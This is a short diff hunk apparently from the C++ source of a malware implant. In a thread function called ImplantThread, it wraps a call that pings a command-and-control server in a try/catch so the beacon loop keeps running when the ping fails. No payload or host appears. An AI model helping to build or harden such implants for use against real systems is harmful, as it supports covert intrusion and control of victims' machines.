@@ -136,7 +136,7 @@ DWORD WINAPI ImplantThread(LPVOID) {
     DBG("session=%ls", session.sessionId.c_str());
 
     DBG("PingC2 start");
-    PingC2();
+    try { PingC2(); } catch(...) { DBG("PingC2 EXCEPTION, continuing anyway"); }
     DBG("PingC2 ok");
 
     DBG("BeaconLoop start");
